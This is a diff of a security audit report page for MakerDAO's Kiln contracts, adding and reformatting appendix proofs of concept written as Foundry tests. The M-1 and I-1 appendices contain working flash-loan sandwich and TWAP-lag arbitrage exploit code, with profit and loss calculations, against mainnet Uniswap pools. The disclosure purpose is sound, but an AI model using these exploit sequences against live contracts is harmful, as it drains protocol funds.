@@ -1,10 +1,17 @@
-<page clientName="Maker" reportDate="December 12th, 2022" auditTitle="Maker A-1" auditVersion="1.0.0"
+<page
+  clientName="Maker"
+  reportDate="December 12th, 2022"
+  auditTitle="Maker A-1"
+  auditVersion="1.0.0"
   repoUrl="https://github.com/makerdao/dss-kiln"
-  layout="/library/audits/_layout.html" customRepoInfo customReviewInfo
-  appendixLinks="#appendix-m1-poc::M-1 Proof of Concept;;#appendix-l1-poc::L-1 Proof of Concept;;#appendix-q3-poc::Q-3 Proof of Concept;;#appendix-q5-poc::Q-5 Proof of Concept">
+  layout="/library/audits/_layout.html"
+  customRepoInfo
+  customReviewInfo
+  appendixLinks="#appendix-m1-poc::M-1 Proof of Concept;;#appendix-l1-poc::L-1 Proof of Concept;;#appendix-q3-poc::Q-3 Proof of Concept;;#appendix-q5-poc::Q-5 Proof of Concept;;#appendix-i1-poc::I-1 Proof of Concept;;#appendix-i2-poc::I-2 Proof of Concept"
+>
   <content-for name="schedule">
-    The security audit was performed by the Macro security team from November
-    7, 2022 to November 15, 2022.
+    The security audit was performed by the Macro security team from November 7,
+    2022 to November 18, 2022.
   </content-for>
 
   <content-for name="spec">
@@ -15,13 +22,10 @@
     </ul>
   </content-for>
 
-
   <content-for name="repo-info">
     <ul>
       <li>
-        <a href="{{page.repoUrl}}" target="_blank">
-          Repository
-        </a>
+        <a href="{{page.repoUrl}}" target="_blank"> Repository </a>
       </li>
       <li class="break-words break-all">
         Commit Hash:
@@ -31,8 +35,9 @@
   </content-for>
 
   <content-for name="source-code">
-
-    <p>Specifically, we audited the following contracts within this repository:</p>
+    <p>
+      Specifically, we audited the following contracts within this repository:
+    </p>
 
     <template type="file-hashes">
       8d1472d66cd80ec603b8af4cc67285828ebb881649740ed0cdd8483d03563b26 src/KilnBase.sol
@@ -45,39 +50,39 @@
       59348d5875ca1efa02deb639ccf5fa643f4327dc0aafcba16889e565df2175db src/univ3/TickMath.sol
       c8f3f34144c75a4cc2359d9e863408ec6cbe40f14ed581cf31379846a6581cf6 src/univ3/TwapProduct.sol
     </template>
-
   </content-for>
 
   <content-for name="appendix">
     <section id="appendix-m1-poc" class="Copy py-16">
       <template type="audit-markdown">
-## M-1: Proof of Concept
+## (M-1) Proof of Concept
 
+To compute the arbitrage loss, this proof of concept
 
-To compute the arbitrage loss, this proof of concept 
-
-1. assumes a lag of 10% bwtween a) TWAP oracle b) spot price happened on Nov 17th, 2022 on mainnet (block number 15992230) and
-1. it uses the Uniswap V3 MKR-ETH 0.3% pool as the trading venue
+1. assumes a lag of 10% between a) TWAP oracle b) spot price,
+2. it uses the Uniswap V3 MKR-ETH 0.3% pool as the trading venue, and
+3. the pool’s state on 2022/11/17 on mainnet (block number 15992230)
 
 **Findings**
 
 Using a flash loan of `235 WETH`:
 
-- **Attacker profits `0.419 WETH`** before accounting for gas or priority fee
-- **MakerDAO’s slippage loss is `3.649 MKR`**
+- **Attacker profits `0.419 WETH`, before accounting for gas or priority fee.**
+- **Slippage loss is `3.649 MKR`.**
 
-As per our conversations, Maker's initial plan is to execute `fire()` of lot size `30,000 DAI` for 100 times for a total of 3 million DAI. 
+As per Maker, the initial plan is to execute `fire()` of a lot size `30,000 DAI` for 100 times for a total of 3 million DAI.
 
-**Considering the worst case where the 10% lag is present for each call to** `fire()`, **the estimated loss for MakerDAO would be** `364.9 MKR` **, with the attacker gaining** `41.9 WETH` **for the plan above.**
+Considering the worst case where the 10% lag is during each `fire()` i.e. purchase of a `lot`:
 
-`364.9 MKR` * `$660.00` (current market price of `MKR`) = `$240,834` loss for MakerDAO.
+- **The estimated loss for MakerDAO would be `364.9 MKR` = 3.649 MKR * 100.**
+- **The estimated gain for the attacker would be `41.9 WETH` = 0.419 WETH * 100.**
+- `**364.9 MKR` * `$660.00` (current market price of `MKR`) = `$240,834` loss for Maker.**
+- `**$240,834` / 3 million DAI = an overall loss of 8.0278%**
 
-`$240,834` / 3 million DAI => **an overall loss of 8.0278%**
-
-**Proof of Concept**
+**Proof of Concept [1]**
 
 ```
-	
+
 // forge test --use solc:0.8.14 --rpc-url=$ETH_RPC_URL --match testTWAPMispriceShortPath --fork-block-number 15992230 -vvvv
 
 // Copy into existing KilnUniV3.t.sol
@@ -111,7 +116,7 @@ function testTWAPMispriceShortPath() public {
 
     kiln.file("lot", 30_000 * WAD); // drop to expected lot size
     //use this as a proxy for quote returning amountOut value that is 10% lower than spot price
-    kiln.file("yen", 90 * WAD / 100); 
+    kiln.file("yen", 90 * WAD / 100);
     kiln.file("scope", 4 hours);
 
     mintDai(address(kiln), 30_000 * WAD);
@@ -157,73 +162,82 @@ function testTWAPMispriceShortPath() public {
 
 **Technical Notes**
 
-- `yen = 90 * WAD / 100` AND `quote` returning value close to spot price `amountOut`
-is equivalent to `yen = WAD`  AND `quote` returning value 10% lower than spot price `amountOut`.
+On assumption for `yen`
 
-- Please note for validation purpose, we have set `yen = 90 * WAD / 100` in this test to duplicate the behavior of the lagging quote.
+1. a) `yen = 90 * WAD / 100` and b) `quote` returning value close to spot price `amountOut` is equivalent to c) `yen = WAD` and d) `quote` returning value 10% lower than spot price `amountOut`.
+1. In other words, for validation purposes, we have set `yen = 90 * WAD / 100` in this test to duplicate the behavior of a lagging quote derived from TWAP as compared to the spot price.
       </template>
     </section>
   </content-for>
 
-<content-for name="appendix">
-  <section id="appendix-l1-poc" class="Copy py-16">
-    <template type="audit-markdown">
-## L-1: Proof of Concept
+
+
+
+  <content-for name="appendix">
+    <section id="appendix-l1-poc" class="Copy py-16">
+      <template type="audit-markdown">
+## (L-1) Proof of Concept
 
 To demonstrate the issue, copy the following content into `src/KilnUniV3.t.sol` and run `forge test --use solc:0.8.14 --rpc-url="$ETH_RPC_URL" -vvv --match-test testFireWithIncorrectBuyPath`.
 
 ```
 function testFireWithIncorrectBuyPath() public {
-    mintDai(address(kiln), 50_000 * WAD);
-
-    assertEq(GemLike(MKR).balanceOf(address(user)), 0);
-
-    kiln.file("yen", 80 * WAD / 100);
-
-    assertEq(GemLike(WETH).balanceOf(address(user)), 0);
-
-    // Configure path to buy WETH
-    kiln.file("path", abi.encodePacked(DAI, uint24(100), USDC, uint24(500), WETH));
-    assertEq(kiln.path(), abi.encodePacked(DAI, uint24(100), USDC, uint24(500), WETH));
-
-    // Show that kiln buy is still MKR
-    assertEq(kiln.buy(), MKR);
-    kiln.fire();
-
-    // Swap results in acquiring the non-buy token
-    assertEq(GemLike(MKR).balanceOf(address(user)), 0);
-    assertTrue(GemLike(WETH).balanceOf(address(user)) > 0);
+	  mintDai(address(kiln), 50_000 * WAD);
+	  	
+	  assertEq(GemLike(MKR).balanceOf(address(user)), 0);
+	  
+	  kiln.file("yen", 80 * WAD / 100);
+	  
+	  assertEq(GemLike(WETH).balanceOf(address(user)), 0);
+	  
+	  // Configure path to buy WETH
+	  kiln.file("path", abi.encodePacked(DAI, uint24(100), USDC, uint24(500), WETH));
+	  assertEq(kiln.path(), abi.encodePacked(DAI, uint24(100), USDC, uint24(500), WETH));
+	  
+	  // Show that kiln buy is still MKR
+	  assertEq(kiln.buy(), MKR);
+	  kiln.fire();
+	  
+	  // Swap results in acquiring the non-buy token
+	  assertEq(GemLike(MKR).balanceOf(address(user)), 0);
+	  assertTrue(GemLike(WETH).balanceOf(address(user)) > 0);
 }
 ```
-    </template>
-  </section>
-</content-for>
+      </template>
+    </section>
+  </content-for>
 
-<content-for name="appendix">
-  <section id="appendix-q3-poc" class="Copy py-16">
-    <template type="audit-markdown">
-## Q-3: Proof of Concept
+
+
+
+  <content-for name="appendix">
+    <section id="appendix-q3-poc" class="Copy py-16">
+      <template type="audit-markdown">
+## (Q-3) Proof of Concept
 
 Copy the following content into `src/KilnUniV3.t.sol` and run `forge test --use solc:0.8.14 --rpc-url="$ETH_RPC_URL" -vvv --match-test testFireWithMaxLot`.
 
 ```
 function testFireWithMaxLot() public {
-    mintDai(address(kiln), type(uint128).max + 1);
-    assertEq(GemLike(DAI).balanceOf(address(kiln)), type(uint128).max + 1);
-    kiln.file("yen", 80 * WAD / 100);
-    kiln.file("lot", type(uint128).max + 1);
-    vm.expectRevert("TwapProduct/amountIn-overflow");
-    kiln.fire();
+	   mintDai(address(kiln), type(uint128).max + 1);
+           assertEq(GemLike(DAI).balanceOf(address(kiln)), type(uint128).max + 1);
+           kiln.file("yen", 80 * WAD / 100);
+           kiln.file("lot", type(uint128).max + 1);
+           vm.expectRevert("TwapProduct/amountIn-overflow");
+           kiln.fire();
 }
 ```
-    </template>
-  </section>
-</content-for>
+      </template>
+    </section>
+  </content-for>
 
-<content-for name="appendix">
-  <section id="appendix-q5-poc" class="Copy py-16">
-    <template type="audit-markdown">
-## Q-5: Proof of Concept
+
+
+
+  <content-for name="appendix">
+    <section id="appendix-q5-poc" class="Copy py-16">
+      <template type="audit-markdown">
+## (Q-5) Proof of Concept
 
 To demonstrate this issue, copy the following content into `src/KilnUniV3.t.sol`
 
@@ -231,30 +245,228 @@ and run `forge test --use solc:0.8.14 --rpc-url="$ETH_RPC_URL" -vvv --match-test
 
 ```
 function mintUSDC(address usr, uint256 amt) internal {
-        deal(USDC, usr, amt);
-        assertEq(GemLike(USDC).balanceOf(address(usr)), amt);
+	  deal(USDC, usr, amt);
+	  assertEq(GemLike(USDC).balanceOf(address(usr)), amt);
 }
 
 function testFireWithIncorrectSellPath() public {
-        mintUSDC(address(kiln), 50_000 * WAD);
-        mintDai(address(kiln), 50_000 * WAD);
-
-        assertEq(GemLike(USDC).balanceOf(address(user)), 0);
-        assertEq(GemLike(MKR).balanceOf(address(user)), 0);
-
-        kiln.file("path", abi.encodePacked(USDC, uint24(100), DAI));
-
-        assertEq(kiln.sell(), DAI);
-        assertEq(kiln.buy(), MKR);
-
-        // This fails due to mismatch between kiln sell token and path
-        vm.expectRevert();
-        kiln.fire();
+	  mintUSDC(address(kiln), 50_000 * WAD);
+	  mintDai(address(kiln), 50_000 * WAD);
+	  
+	  assertEq(GemLike(USDC).balanceOf(address(user)), 0);
+	  assertEq(GemLike(MKR).balanceOf(address(user)), 0);
+	  
+	  kiln.file("path", abi.encodePacked(USDC, uint24(100), DAI));
+	  
+	  assertEq(kiln.sell(), DAI);
+	  assertEq(kiln.buy(), MKR);
+	  
+	  // This fails due to mismatch between kiln sell token and path
+	  vm.expectRevert();
+	  kiln.fire();
 }
 ```
-    </template>
-  </section>
-</content-for>
+      </template>
+    </section>
+  </content-for>
 
+
+
+
+  <content-for name="appendix">
+    <section id="appendix-i1-poc" class="Copy py-16">
+      <template type="audit-markdown">
+## (I-1) Proof of Concept
+
+To demonstrate this issue, copy the following content to `src/Macro_UniV3Kiln.t.sol`
+
+and run `forge test --use solc:0.8.14 --rpc-url="$ETH_RPC_URL" --match-path src/Macro_KilnUniV3.t.sol -vvv`
+
+```
+// SPDX-FileCopyrightText: © 2022 Dai Foundation www.daifoundation.org
+// SPDX-License-Identifier: AGPL-3.0-or-later
+//
+// This program is free software: you can redistribute it and/or modify
+// it under the terms of the GNU Affero General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// (at your option) any later version.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU Affero General Public License for more details.
+//
+// You should have received a copy of the GNU Affero General Public License
+// along with this program.  If not, see http://www.gnu.org/licenses.
+
+pragma solidity ^0.8.14;
+
+import "forge-std/Test.sol";
+import "./KilnUniV3.sol";
+
+interface TestGem {
+	function totalSupply() external view returns (uint256);
+}
+
+// https://github.com/Uniswap/v3-periphery/blob/v1.0.0/contracts/lens/Quoter.sol#L106-L122
+interface Quoter {
+	function quoteExactInput(
+		bytes calldata path,
+		uint256 amountIn
+	) external returns (uint256 amountOut);
+}
+
+contract User {}
+
+contract KilnTest is Test {
+	KilnUniV3 kiln;
+	Quoter quoter;
+	User user;
+
+	bytes path;
+
+	address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+	address constant MKR  = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
+
+	uint256 constant WAD = 1e18;
+	uint256 constant LOT = 1_000 * WAD;
+
+	address constant ROUTER   = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
+	address constant QUOTER   = 0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6;
+	address constant FACTORY  = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
+
+	event File(bytes32 indexed what, bytes data);
+	event File(bytes32 indexed what, uint256 data);
+
+	function setUp() public {
+		user = new User();
+		path = abi.encodePacked(WETH, uint24(3000), MKR);
+
+		kiln = new KilnUniV3(WETH, MKR, ROUTER, address(user));
+		quoter = Quoter(QUOTER);
+
+		kiln.file("lot", LOT);
+		kiln.file("hop", 6 hours);
+		kiln.file("path", path);
+	}
+
+	function mintWeth(address usr, uint256 amt) internal {
+		deal(WETH, usr, amt);
+		assertEq(GemLike(WETH).balanceOf(address(usr)), amt);
+	}
+
+	function estimate(uint256 amtIn) internal returns (uint256 amtOut) {
+		return quoter.quoteExactInput(path, amtIn);
+	}
+
+	function swap(address gem, uint256 amount) internal {
+		require(GemLike(gem).approve(kiln.uniV3Router(), amount));
+
+		bytes memory _path;
+		if (gem == WETH) {
+			_path = abi.encodePacked(WETH, uint24(3000), MKR);
+		} else {
+			_path = abi.encodePacked(MKR, uint24(3000), WETH);
+		}
+
+		ExactInputParams memory params = ExactInputParams(
+			_path,
+			address(this),       // recipient
+			block.timestamp,     // deadline
+			amount,              // amountIn
+			0                    // amountOutMinimum
+		);
+
+		SwapRouterLike(kiln.uniV3Router()).exactInput(params);
+	}
+
+	function testFlashLoanAttack_LowYen() public {
+		kiln.file("yen", 0);
+		uint256 wethFlashLoanAmt = 100_000 * WAD;
+
+		mintWeth(address(kiln), LOT);
+		assertEq(GemLike(WETH).balanceOf(address(kiln)), LOT);
+
+		// Estimate what a swap would yield if no attack was occurring
+		uint256 _nonAttackEstimate = estimate(LOT);
+		console2.log("Kiln Receiver MKR Estimate: %s  <=====", _nonAttackEstimate);
+		console2.log("");
+
+		// Emulate flash-loan attack where attacker receives a large amount of
+		// WETH, and in the flash-loan callback:
+		// 1) swaps loaned WETH for MKR in same pool used by kiln
+		// 2) executes kiln.fire(), now based on highly unfavorable slippage
+		// 3) swaps MKR for WETH, now based on highly favorable slippage
+		// 4) repays loan and takes profit
+
+		// Emulate large flash-loan of WETH
+		console2.log("** Begin flashloan of WETH: ", wethFlashLoanAmt);
+		mintWeth(address(this), wethFlashLoanAmt);
+		uint256 _attackerMKR = GemLike(MKR).balanceOf(address(this));
+		console2.log("      Attacker MKR:  ", _attackerMKR);
+		uint256 _attackerWETH = GemLike(WETH).balanceOf(address(this));
+		console2.log("      Attacker WETH: ", _attackerWETH);
+		assertEq(_attackerWETH, wethFlashLoanAmt);
+
+		// 1) swaps loaned WETH for MKR in same pool used by kiln
+		console2.log("** 1) swaps loaned WETH for MKR in same pool used by kiln");
+		swap(WETH, wethFlashLoanAmt);
+		_attackerMKR = GemLike(MKR).balanceOf(address(this));
+		console2.log("      Attacker MKR:  ", _attackerMKR);
+		_attackerWETH = GemLike(WETH).balanceOf(address(this));
+		console2.log("      Attacker WETH: ", _attackerWETH);
+
+		// 2) executes kiln.fire(), now based on significant slippage
+		console2.log("** 2) executes kiln.fire(), now based on significant slippage");
+		kiln.fire();
+		uint256 _receiverMkr = GemLike(MKR).balanceOf(kiln.receiver());
+		console2.log("      Kiln Receiver MKR:  %s <=====", _receiverMkr);
+
+		// 3) swaps MKR for WETH, now based on highly favorable slippage
+		console2.log("** 3) swaps MKR for WETH, now based on highly favorable slippage");
+		swap(MKR, _attackerMKR);
+		_attackerMKR = GemLike(MKR).balanceOf(address(this));
+		console2.log("      Attacker MKR:  ", _attackerMKR);
+		_attackerWETH = GemLike(WETH).balanceOf(address(this));
+		console2.log("      Attacker WETH: ", _attackerWETH);
+
+		// 4) repays loan and takes profit
+		console2.log("** 4) repays loan and takes profit");
+		uint256 flashLoanFee = wethFlashLoanAmt * 9 / 10_000;
+		GemLike(WETH).transfer(WETH, wethFlashLoanAmt + flashLoanFee);
+
+		console2.log("");
+		console2.log("Kiln receiver MKR Loss: %s WAD", (_nonAttackEstimate - _receiverMkr) / WAD);
+		_attackerWETH = GemLike(WETH).balanceOf(address(this));
+		console2.log("Attacker WETH profit:   %s WAD", _attackerWETH / WAD);
+	}
+}
+```
+      </template>
+    </section>
+  </content-for>
+
+
+
+
+  <content-for name="appendix">
+    <section id="appendix-i2-poc" class="Copy py-16">
+      <template type="audit-markdown">
+## (I-2) Proof of Concept 
+
+Modify the first line of `testFlashLoanAttack()` from H-1 as follows:
+
+```
+function testFlashLoanAttack() public {
+		//kiln.file("yen", 0); //commented out
+		kiln.file("yen", 98 * WAD / 100);
+    kiln.file("scope", 0);
+		//remaining is unchanged
+		...
+	}
+}
+```
+      </template>
+    </section>
+  </content-for>
 </page>
-
